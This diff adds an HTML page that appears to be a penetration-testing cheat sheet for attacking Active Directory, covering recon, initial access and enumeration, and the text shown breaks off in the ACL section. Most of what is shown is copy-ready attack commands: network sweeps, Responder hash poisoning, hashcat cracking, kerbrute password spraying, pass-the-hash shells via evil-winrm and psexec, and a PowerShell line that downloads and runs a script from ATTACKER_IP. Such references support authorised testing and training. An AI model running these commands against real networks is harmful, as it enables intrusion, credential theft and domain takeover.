@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    /* ── TABS ── */
+    .tab-bar {
+      display: flex; gap: 0; margin-bottom: 28px;
+      border-bottom: 1px solid var(--border);
+      overflow-x: auto;
+    }
+    .tab-bar::-webkit-scrollbar { height: 3px; }
+    .tab-bar::-webkit-scrollbar-thumb { background: var(--surface2); }
+
+    .tab {
+      padding: 10px 18px; font-family: var(--mono); font-size: 11px;
+      color: var(--muted); cursor: pointer; white-space: nowrap;
+      border-bottom: 2px solid transparent; transition: all .15s;
+      user-select: none;
+    }
+    .tab:hover { color: var(--text); }
+    .tab.active { color: var(--green); border-bottom-color: var(--green); }
+
+    /* ── TAB PAGES ── */
+    .tab-page { display: none; }
+    .tab-page.active { display: block; }
+
+    /* ── STATS ROW ── */
+    .stat-row { display: grid; grid-template-columns: repeat(4,1fr); gap: 12px; margin-bottom: 28px; }
+    .stat-card { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 18px; text-align: center; }
+    .stat-num { font-family: var(--mono); font-size: 30px; font-weight: 700; line-height: 1; color: var(--green); }
+    .stat-lbl { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-top: 6px; text-transform: uppercase; letter-spacing: .08em; }
+    @media(max-width:600px){ .stat-row { grid-template-columns: repeat(2,1fr); } }
+
+    /* ── ATTACK CHAIN ── */
+    .chain-wrap { overflow-x: auto; padding-bottom: 8px; margin-bottom: 24px; }
+    .chain { display: flex; align-items: center; gap: 0; min-width: 660px; padding: 4px 0; }
+    .chain-step { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; padding: 10px 14px; text-align: center; flex: 1; }
+    .chain-step .cn { font-family: var(--mono); font-size: 9px; color: var(--muted); margin-bottom: 3px; }
+    .chain-step .cl { font-family: var(--mono); font-size: 11px; font-weight: 500; color: var(--green); line-height: 1.3; }
+    .chain-arrow { color: var(--border); font-size: 18px; padding: 0 6px; flex-shrink: 0; }
+
+    /* ── PHASE LABEL ── */
+    .phase-lbl {
+      font-family: var(--mono); font-size: 10px; font-weight: 700;
+      letter-spacing: .12em; text-transform: uppercase; color: var(--muted);
+      margin: 24px 0 10px; padding-bottom: 6px;
+      border-bottom: 1px solid var(--border);
+    }
+    .phase-lbl:first-child { margin-top: 0; }
+
+    /* ── ACCORDION CARD ── */
+    .ac { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 8px; overflow: hidden; }
+    .ac:hover { border-color: var(--surface2); }
+
+    .ac-hdr {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px; cursor: pointer; user-select: none;
+      transition: background .1s;
+    }
+    .ac-hdr:hover { background: var(--surface); }
+    .ac-hdr.static { cursor: default; }
+    .ac-hdr.static:hover { background: transparent; }
+
+    .ac-tag {
+      font-family: var(--mono); font-size: 9px; font-weight: 700;
+      padding: 2px 7px; border-radius: 3px; letter-spacing: .5px;
+      flex-shrink: 0; text-transform: uppercase; border: 1px solid;
+    }
+    .t-recon   { background: rgba(57,211,83,.08);  color: var(--green);  border-color: rgba(57,211,83,.25);  }
+    .t-enum    { background: rgba(57,197,207,.08); color: var(--teal);   border-color: rgba(57,197,207,.25); }
+    .t-exploit { background: rgba(248,81,73,.08);  color: var(--red);    border-color: rgba(248,81,73,.25);  }
+    .t-lateral { background: rgba(255,166,87,.08); color: var(--orange); border-color: rgba(255,166,87,.25); }
+    .t-priv    { background: rgba(188,140,255,.08);color: var(--purple); border-color: rgba(188,140,255,.25);}
+    .t-persist { background: rgba(227,179,65,.08); color: var(--yellow); border-color: rgba(227,179,65,.25); }
+    .t-cred    { background: rgba(88,166,255,.08); color: var(--accent); border-color: rgba(88,166,255,.25); }
+
+    .ac-title { font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--text); flex: 1; }
+    .ac-arrow { color: var(--muted); font-size: 10px; transition: transform .2s; flex-shrink: 0; }
+    .ac-arrow.open { transform: rotate(90deg); }
+
+    .ac-body { display: none; padding: 0 14px 14px; border-top: 1px solid var(--border); }
+    .ac-body.open { display: block; }
+
+    /* ── DESCRIPTION ── */
+    .desc { font-family: var(--mono); font-size: 11px; color: var(--muted); margin: 10px 0 8px; line-height: 1.7; }
+
+    /* ── COMMAND BLOCK ── */
+    .cb {
+      background: var(--surface2); border: 1px solid transparent;
+      border-radius: 5px; padding: 8px 11px; margin: 5px 0;
+      cursor: pointer; transition: all .15s; position: relative;
+    }
+    .cb:hover { background: var(--surface); border-color: var(--border); }
+    .cb.copied { border-color: rgba(57,211,83,.4); background: rgba(57,211,83,.05); }
+
+    .cb-comment { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-bottom: 3px; }
+    .cb-cmd { font-family: var(--mono); font-size: 12px; color: var(--orange); line-height: 1.7; word-break: break-all; white-space: pre-wrap; }
+    .cb-cmd .kw  { color: var(--accent); }
+    .cb-cmd .arg { color: var(--yellow); }
+    .cb-cmd .flg { color: var(--purple); }
+
+    .cb-hint { position: absolute; right: 8px; top: 8px; font-family: var(--mono); font-size: 9px; color: var(--muted); opacity: 0; transition: opacity .15s; }
+    .cb:hover .cb-hint { opacity: 1; }
+    .cb.copied .cb-hint { opacity: 1; color: var(--green); }
+
+    /* ── CALLOUTS ── */
+    .cn-note { background: rgba(57,211,83,.06); border-left: 2px solid var(--green); padding: 7px 12px; margin: 8px 0; font-family: var(--mono); font-size: 10px; color: #7aff9e; line-height: 1.6; border-radius: 0 5px 5px 0; }
+    .cn-warn { background: rgba(248,81,73,.06); border-left: 2px solid var(--red);   padding: 7px 12px; margin: 8px 0; font-family: var(--mono); font-size: 10px; color: #ff9e9e; line-height: 1.6; border-radius: 0 5px 5px 0; }
+
+    /* ── BADGE ROW ── */
+    .badge-row { display: flex; flex-wrap: wrap; gap: 5px; margin: 8px 0; }
+    .badge { font-family: var(--mono); font-size: 9px; padding: 2px 8px; border-radius: 3px; border: 1px solid; font-weight: 500; }
+    .b-tool { border-color: rgba(57,211,83,.2);  color: var(--green);  background: rgba(57,211,83,.06);  }
+    .b-port { border-color: rgba(57,197,207,.2); color: var(--teal);   background: rgba(57,197,207,.06); }
+    .b-hash { border-color: rgba(248,81,73,.2);  color: var(--red);    background: rgba(248,81,73,.06);  }
+
+    /* ── GRID 2 ── */
+    .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    @media(max-width:700px){ .grid2 { grid-template-columns: 1fr; } }
+
+    /* ── PATH CARDS (overview) ── */
+    .path-card { background: var(--bg3); border: 1px solid var(--border); border-radius: 7px; padding: 11px 14px; margin-bottom: 7px; display: flex; align-items: center; gap: 10px; }
+
+    /* ── SEARCH ── */
+    .tab-search { position: relative; margin-bottom: 20px; }
+    .tab-search input {
+      width: 100%; background: var(--surface); border: 1px solid var(--border);
+      border-radius: 6px; padding: 8px 12px 8px 34px;
+      font-family: var(--mono); font-size: 12px; color: var(--text); outline: none;
+      transition: border-color .15s;
+    }
+    .tab-search input::placeholder { color: var(--muted); }
+    .tab-search input:focus { border-color: rgba(57,211,83,.5); }
+    .tab-search-ico { position: absolute; left: 11px; top: 50%; transform: translateY(-50%); color: var(--muted); pointer-events: none; font-size: 14px; }
+
+    .hidden-card { display: none !important; }
+  </style>
+</head>
+<body>
+<div class="page-content">
+
+  <!-- ── TAB BAR ── -->
+  <div class="tab-bar">
+    <div class="tab active"  data-tab="overview">Overview</div>
+    <div class="tab" data-tab="recon">1. Recon</div>
+    <div class="tab" data-tab="initial">2. Initial Access</div>
+    <div class="tab" data-tab="enum">3. AD Enumeration</div>
+    <div class="tab" data-tab="lateral">4. Lateral Movement</div>
+    <div class="tab" data-tab="priv">5. Privilege Escalation</div>
+    <div class="tab" data-tab="da">6. Domain Compromise</div>
+    <div class="tab" data-tab="creds">Credentials</div>
+  </div>
+
+  <!-- ══════════════════════════════════ OVERVIEW ═══════════════════════════════ -->
+  <div class="tab-page active" id="tab-overview">
+
+    <div class="stat-row">
+      <div class="stat-card"><div class="stat-num">6</div><div class="stat-lbl">Attack Phases</div></div>
+      <div class="stat-card"><div class="stat-num" style="color:var(--orange)">40+</div><div class="stat-lbl">Techniques</div></div>
+      <div class="stat-card"><div class="stat-num" style="color:var(--accent)">20+</div><div class="stat-lbl">Tools</div></div>
+      <div class="stat-card"><div class="stat-num" style="color:var(--red)">DA</div><div class="stat-lbl">End Goal</div></div>
+    </div>
+
+    <div class="chain-wrap">
+      <div class="chain">
+        <div class="chain-step"><div class="cn">01</div><div class="cl">Network Recon</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">02</div><div class="cl">Initial Access</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">03</div><div class="cl">AD Enumeration</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">04</div><div class="cl">Cred Dumping</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">05</div><div class="cl">Lateral Movement</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">06</div><div class="cl">Priv Escalation</div></div>
+        <div class="chain-arrow">→</div>
+        <div class="chain-step"><div class="cn">07</div><div class="cl">Domain Admin</div></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Key Tools by Phase</div>
+    <div class="grid2">
+      <div class="ac"><div class="ac-hdr static"><span class="ac-tag t-recon">RECON</span><span class="ac-title">Discovery Tools</span></div>
+        <div class="ac-body open" style="display:block"><div class="badge-row">
+          <span class="badge b-tool">nmap</span><span class="badge b-tool">masscan</span><span class="badge b-tool">crackmapexec</span><span class="badge b-tool">nbtscan</span><span class="badge b-tool">enum4linux</span><span class="badge b-tool">ldapsearch</span><span class="badge b-tool">BloodHound</span>
+        </div></div>
+      </div>
+      <div class="ac"><div class="ac-hdr static"><span class="ac-tag t-exploit">EXPLOIT</span><span class="ac-title">Initial Access Tools</span></div>
+        <div class="ac-body open" style="display:block"><div class="badge-row">
+          <span class="badge b-tool">responder</span><span class="badge b-tool">evil-winrm</span><span class="badge b-tool">psexec.py</span><span class="badge b-tool">smbclient</span><span class="badge b-tool">hydra</span><span class="badge b-tool">metasploit</span>
+        </div></div>
+      </div>
+      <div class="ac"><div class="ac-hdr static"><span class="ac-tag t-cred">CREDS</span><span class="ac-title">Credential Tools</span></div>
+        <div class="ac-body open" style="display:block"><div class="badge-row">
+          <span class="badge b-tool">mimikatz</span><span class="badge b-tool">secretsdump</span><span class="badge b-tool">hashcat</span><span class="badge b-tool">john</span><span class="badge b-tool">kerbrute</span><span class="badge b-tool">GetNPUsers.py</span>
+        </div></div>
+      </div>
+      <div class="ac"><div class="ac-hdr static"><span class="ac-tag t-priv">PRIVESC</span><span class="ac-title">AD Attack Tools</span></div>
+        <div class="ac-body open" style="display:block"><div class="badge-row">
+          <span class="badge b-tool">BloodHound</span><span class="badge b-tool">PowerView</span><span class="badge b-tool">SharpHound</span><span class="badge b-tool">Rubeus</span><span class="badge b-tool">impacket</span><span class="badge b-tool">PowerSploit</span>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Common Attack Paths</div>
+    <div class="path-card"><span class="ac-tag t-exploit">PATH A</span><span class="ac-title" style="font-family:var(--mono);font-size:12px;color:var(--muted)">LLMNR Poisoning → NTLMv2 Crack → SMB Access → BloodHound → DCSync</span></div>
+    <div class="path-card"><span class="ac-tag t-priv">PATH B</span><span class="ac-title" style="font-family:var(--mono);font-size:12px;color:var(--muted)">Kerberoasting → Ticket Crack → Lateral Movement → DA Group Add</span></div>
+    <div class="path-card"><span class="ac-tag t-lateral">PATH C</span><span class="ac-title" style="font-family:var(--mono);font-size:12px;color:var(--muted)">AS-REP Roasting → Hash Crack → Pass-the-Hash → secretsdump → Golden Ticket</span></div>
+    <div class="path-card"><span class="ac-tag t-recon">PATH D</span><span class="ac-title" style="font-family:var(--mono);font-size:12px;color:var(--muted)">Anonymous LDAP → Misconfig Enum → ACL Abuse (GenericWrite/ForceChangePassword) → DA</span></div>
+
+  </div>
+
+  <!-- ══════════════════════════════════ RECON ═══════════════════════════════ -->
+  <div class="tab-page" id="tab-recon">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-recon"></div>
+
+    <div class="phase-lbl">Network Scanning</div>
+
+    <div class="ac" data-search="nmap scan host discovery ping sweep">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">SCAN</span><span class="ac-title">Host Discovery</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Identify live hosts on the network before deep scanning.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Ping sweep</div><div class="cb-cmd">nmap <span class="flg">-sn</span> <span class="arg">192.168.1.0/24</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># ARP scan (faster on LAN)</div><div class="cb-cmd">netdiscover <span class="flg">-r</span> <span class="arg">192.168.1.0/24</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Masscan for large ranges</div><div class="cb-cmd">masscan <span class="arg">192.168.1.0/24</span> <span class="flg">-p</span><span class="arg">80,443,445,3389</span> <span class="flg">--rate</span> <span class="arg">1000</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="nmap port scan services AD windows">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">SCAN</span><span class="ac-title">AD Port &amp; Service Scan</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Key AD ports: 53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/636 (LDAP), 3268 (GC), 3389 (RDP), 5985 (WinRM).</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Full AD port scan with scripts</div><div class="cb-cmd">nmap <span class="flg">-sC -sV -p</span> <span class="arg">53,88,135,139,389,445,636,3268,3389,5985,9389</span> <span class="flg">-oN</span> <span class="arg">ad_scan.txt</span> <span class="arg">TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Full port scan then script scan</div><div class="cb-cmd">nmap <span class="flg">-p- --min-rate</span> <span class="arg">5000</span> <span class="arg">TARGET_IP</span> <span class="flg">-oN</span> <span class="arg">allports.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="badge-row"><span class="badge b-port">88=Kerberos</span><span class="badge b-port">389=LDAP</span><span class="badge b-port">445=SMB</span><span class="badge b-port">5985=WinRM</span><span class="badge b-port">3389=RDP</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">SMB &amp; NetBIOS Enumeration</div>
+
+    <div class="ac" data-search="smb enum crackmapexec shares null session">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">SMB</span><span class="ac-title">SMB Enumeration</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Null session check</div><div class="cb-cmd">smbclient <span class="flg">-N -L</span> <span class="arg">//TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># CME SMB enum (null auth)</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">''</span> <span class="flg">-p</span> <span class="arg">''</span> <span class="flg">--shares</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># enum4linux full scan</div><div class="cb-cmd">enum4linux <span class="flg">-a</span> <span class="arg">TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># nbtscan for NetBIOS names</div><div class="cb-cmd">nbtscan <span class="arg">192.168.1.0/24</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Spider shares for interesting files</div><div class="cb-cmd">crackmapexec smb <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">USER</span> <span class="flg">-p</span> <span class="arg">PASS</span> <span class="flg">-M</span> <span class="arg">spider_plus</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="ldap anonymous enum domain">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">LDAP</span><span class="ac-title">LDAP Enumeration</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Anonymous LDAP bind</div><div class="cb-cmd">ldapsearch <span class="flg">-x -H</span> <span class="arg">ldap://TARGET_IP</span> <span class="flg">-b</span> <span class="arg">"DC=domain,DC=local"</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Get all users (authenticated)</div><div class="cb-cmd">ldapsearch <span class="flg">-x -H</span> <span class="arg">ldap://TARGET_IP</span> <span class="flg">-b</span> <span class="arg">"DC=domain,DC=local"</span> <span class="flg">-D</span> <span class="arg">"user@domain.local"</span> <span class="flg">-w</span> <span class="arg">PASSWORD</span> <span class="arg">"(objectclass=person)"</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># windapsearch (cleaner output)</div><div class="cb-cmd">windapsearch <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="flg">--dc-ip</span> <span class="arg">DC_IP</span> <span class="flg">-u</span> <span class="arg">user@domain.local</span> <span class="flg">-p</span> <span class="arg">PASS</span> <span class="flg">--da</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">DNS Enumeration</div>
+
+    <div class="ac" data-search="dns zone transfer dig nslookup">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">DNS</span><span class="ac-title">DNS Recon &amp; Zone Transfer</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Zone transfer attempt</div><div class="cb-cmd">dig axfr <span class="arg">@DC_IP domain.local</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Bruteforce subdomains</div><div class="cb-cmd">gobuster dns <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="flg">-w</span> <span class="arg">/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span> <span class="flg">-r</span> <span class="arg">DC_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># dnsrecon</div><div class="cb-cmd">dnsrecon <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="flg">-n</span> <span class="arg">DC_IP</span> <span class="flg">-t</span> <span class="arg">axfr</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ INITIAL ACCESS ═══════════════════════ -->
+  <div class="tab-page" id="tab-initial">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-initial"></div>
+
+    <div class="phase-lbl">LLMNR / NBT-NS Poisoning</div>
+
+    <div class="ac" data-search="responder llmnr nbt-ns poisoning ntlm capture hash">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-exploit">POISON</span><span class="ac-title">Responder — LLMNR/NBT-NS Poisoning</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Intercept broadcast name resolution to capture NTLMv2 hashes from machines trying to resolve hostnames.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Start responder on interface</div><div class="cb-cmd">responder <span class="flg">-I</span> <span class="arg">eth0</span> <span class="flg">-dwv</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Crack captured hash (NTLMv2)</div><div class="cb-cmd">hashcat <span class="flg">-m</span> <span class="arg">5600</span> <span class="arg">hashes.txt</span> <span class="arg">/usr/share/wordlists/rockyou.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cn-note">Hashes saved to: /usr/share/responder/logs/ — look for NTLMv2 entries</div>
+        <div class="cn-warn">Requires being on the same network segment. Very noisy — avoid in stealth engagements.</div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Username Enumeration</div>
+
+    <div class="ac" data-search="kerbrute username enum kerberos brute spray">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-recon">KERBEROS</span><span class="ac-title">Kerbrute — Username Enumeration</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">Enumerate valid domain usernames via Kerberos pre-auth without triggering lockout.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Enumerate users</div><div class="cb-cmd">kerbrute userenum <span class="flg">--dc</span> <span class="arg">DC_IP</span> <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="arg">/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Password spray (careful: lockout!)</div><div class="cb-cmd">kerbrute passwordspray <span class="flg">--dc</span> <span class="arg">DC_IP</span> <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="arg">users.txt</span> <span class="arg">Password123!</span></div><span class="cb-hint">copy</span></div>
+        <div class="cn-warn">Password spraying: check lockout policy first. Default is 5 attempts / 30 min.</div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">Remote Access</div>
+
+    <div class="ac" data-search="winrm evil-winrm remote shell powershell">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-exploit">WINRM</span><span class="ac-title">Evil-WinRM — Remote Shell</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Connect with credentials</div><div class="cb-cmd">evil-winrm <span class="flg">-i</span> <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Administrator</span> <span class="flg">-p</span> <span class="arg">Password123!</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Connect with NTLM hash (pass-the-hash)</div><div class="cb-cmd">evil-winrm <span class="flg">-i</span> <span class="arg">TARGET_IP</span> <span class="flg">-u</span> <span class="arg">Administrator</span> <span class="flg">-H</span> <span class="arg">NTLM_HASH</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Upload / download files</div><div class="cb-cmd">upload <span class="arg">/path/to/file.ps1</span>
+download <span class="arg">C:\path\to\file</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="psexec smb exec remote impacket wmiexec smbexec">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-exploit">SMB</span><span class="ac-title">Impacket — psexec / smbexec / wmiexec</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># psexec (SYSTEM shell, very noisy)</div><div class="cb-cmd">psexec.py <span class="arg">domain.local/Administrator:Password@TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># wmiexec (semi-interactive, less noisy)</div><div class="cb-cmd">wmiexec.py <span class="arg">domain.local/user:Password@TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># smbexec (no binary drop)</div><div class="cb-cmd">smbexec.py <span class="arg">domain.local/user:Password@TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Pass-the-hash with impacket</div><div class="cb-cmd">psexec.py <span class="flg">-hashes</span> <span class="arg">:NTLM_HASH</span> <span class="arg">domain/Administrator@TARGET_IP</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="rdp xfreerdp remote desktop">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-exploit">RDP</span><span class="ac-title">RDP Access — xfreerdp</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Basic RDP connection</div><div class="cb-cmd">xfreerdp <span class="flg">/v:</span><span class="arg">TARGET_IP</span> <span class="flg">/u:</span><span class="arg">Administrator</span> <span class="flg">/p:</span><span class="arg">Password123!</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># With drive sharing and ignore cert</div><div class="cb-cmd">xfreerdp <span class="flg">/v:</span><span class="arg">TARGET_IP</span> <span class="flg">/u:</span><span class="arg">USER</span> <span class="flg">/p:</span><span class="arg">PASS</span> <span class="flg">/drive:</span><span class="arg">share,/tmp</span> <span class="flg">/cert-ignore</span> <span class="flg">+clipboard</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Pass-the-hash via RDP (Restricted Admin mode required)</div><div class="cb-cmd">xfreerdp <span class="flg">/v:</span><span class="arg">TARGET_IP</span> <span class="flg">/u:</span><span class="arg">Administrator</span> <span class="flg">/pth:</span><span class="arg">NTLM_HASH</span> <span class="flg">/cert-ignore</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════ AD ENUMERATION ═══════════════════════ -->
+  <div class="tab-page" id="tab-enum">
+    <div class="tab-search"><span class="tab-search-ico">⌕</span><input type="text" placeholder="filter commands..." data-target="tab-enum"></div>
+
+    <div class="phase-lbl">BloodHound — Attack Path Mapping</div>
+
+    <div class="ac" data-search="bloodhound sharphound neo4j graph attack path">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-enum">BLOODHOUND</span><span class="ac-title">SharpHound Collection &amp; BloodHound Analysis</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <p class="desc">BloodHound maps AD attack paths. SharpHound collects data; BloodHound visualizes it in Neo4j.</p>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Run SharpHound from target (PowerShell)</div><div class="cb-cmd">.\SharpHound.exe <span class="flg">-c</span> <span class="arg">All</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># bloodhound-python from Kali (remote)</div><div class="cb-cmd">bloodhound-python <span class="flg">-u</span> <span class="arg">user</span> <span class="flg">-p</span> <span class="arg">Password</span> <span class="flg">-d</span> <span class="arg">domain.local</span> <span class="flg">-ns</span> <span class="arg">DC_IP</span> <span class="flg">-c</span> <span class="arg">All</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Start Neo4j + BloodHound</div><div class="cb-cmd">sudo neo4j start
+bloodhound &</div><span class="cb-hint">copy</span></div>
+        <div class="cn-note">Useful queries: "Find Shortest Paths to DA" · "Find AS-REP Roastable Users" · "Find Kerberoastable Users" · "Shortest Path from Owned Principals"</div>
+      </div>
+    </div>
+
+    <div class="phase-lbl">PowerView — Manual Enumeration</div>
+
+    <div class="ac" data-search="powerview powershell domain users groups computers GPO">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-enum">POWERVIEW</span><span class="ac-title">Domain Users, Groups &amp; Computers</span><span class="ac-arrow">▸</span></div>
+      <div class="ac-body">
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Load PowerView</div><div class="cb-cmd"><span class="kw">Import-Module</span> <span class="arg">.\PowerView.ps1</span>
+<span class="kw">IEX</span>(New-Object Net.WebClient).<span class="kw">DownloadString</span>(<span class="arg">'http://ATTACKER_IP/PowerView.ps1'</span>)</div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Domain info</div><div class="cb-cmd"><span class="kw">Get-Domain</span>
+<span class="kw">Get-DomainController</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Enumerate users</div><div class="cb-cmd"><span class="kw">Get-DomainUser</span> | <span class="kw">select</span> <span class="arg">samaccountname,description,memberof,pwdlastset</span>
+<span class="kw">Get-DomainUser</span> <span class="flg">-SPN</span>             <span class="flg"># Kerberoastable</span>
+<span class="kw">Get-DomainUser</span> <span class="flg">-PreauthNotRequired</span> <span class="flg"># AS-REP roastable</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Enumerate groups</div><div class="cb-cmd"><span class="kw">Get-DomainGroupMember</span> <span class="flg">-Identity</span> <span class="arg">"Domain Admins"</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Local admin access (where can I go?)</div><div class="cb-cmd"><span class="kw">Find-LocalAdminAccess</span></div><span class="cb-hint">copy</span></div>
+        <div class="cb" onclick="copyCb(this)"><div class="cb-comment"># Find where a user is logged in</div><div class="cb-cmd"><span class="kw">Get-DomainUserLocation</span> <span class="flg">-UserIdentity</span> <span class="arg">administrator</span></div><span class="cb-hint">copy</span></div>
+      </div>
+    </div>
+
+    <div class="ac" data-search="powerview ACL ACE permissions abusable GenericAll GenericWrite">
+      <div class="ac-hdr" onclick="toggleAc(this)"><span class="ac-tag t-enum">ACL</span><span class="ac-title">ACL / Permission Enumeration</span><span class="ac-arrow">▸</span></div>
